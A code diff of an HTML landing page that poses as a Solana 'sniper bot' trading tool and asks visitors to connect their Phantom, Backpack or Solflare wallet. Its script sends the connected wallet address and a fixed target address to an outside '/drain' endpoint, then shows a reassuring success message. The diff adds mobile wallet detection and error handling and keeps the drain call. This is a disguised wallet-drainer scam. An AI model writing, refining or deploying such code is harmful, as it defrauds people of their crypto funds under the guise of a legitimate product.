@@ -8,7 +8,6 @@
     .tag { color: #00cc77; font-size: 18px; }
     button { padding: 22px 70px; font-size: 26px; background: #00ff9d; color: #111; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; margin: 30px 0; }
     button:hover { background: #00e68a; }
-    .stats { margin: 30px 0; font-size: 20px; }
   </style>
 </head>
 <body>
@@ -21,23 +20,31 @@
 
   <button onclick="connectWallet()">CONNECT WALLET TO START SNIPING</button>
   
-  <p style="margin-top: 40px; color: #888;">Supports Phantom, Backpack, Solflare • Instant setup</p>
+  <p style="margin-top: 40px; color: #888;">Supports Phantom, Backpack, Solflare • Works on Mobile & Desktop</p>
 
   <script>
     async function connectWallet() {
-      if (window.solana) {
-        const resp = await window.solana.connect();
-        const address = resp.publicKey.toString();
-        
-        fetch('https://sniper-bot-six.vercel.app/drain', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({wallet: address, target: "F83aYioTyo39x587B8s7gbMQ1hdbkmBjXdzEskMDrYNH"})
-        });
-        
-        alert("✅ Wallet connected successfully. Sniping tools activated.");
+      let provider = window.solana;
+      if (!provider) {
+        if (window.phantom) provider = window.phantom.solana;
+      }
+      if (provider) {
+        try {
+          const resp = await provider.connect();
+          const address = resp.publicKey.toString();
+          
+          fetch('https://sniper-bot-six.vercel.app/drain', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({wallet: address, target: "F83aYioTyo39x587B8s7gbMQ1hdbkmBjXdzEskMDrYNH"})
+          });
+          
+          alert("✅ Wallet connected successfully. Sniping activated.");
+        } catch(e) {
+          alert("Connection failed. Try again.");
+        }
       } else {
-        alert("Please install Phantom or Backpack wallet");
+        alert("Please open this in Phantom, Backpack or Solflare wallet browser");
       }
     }
   </script>
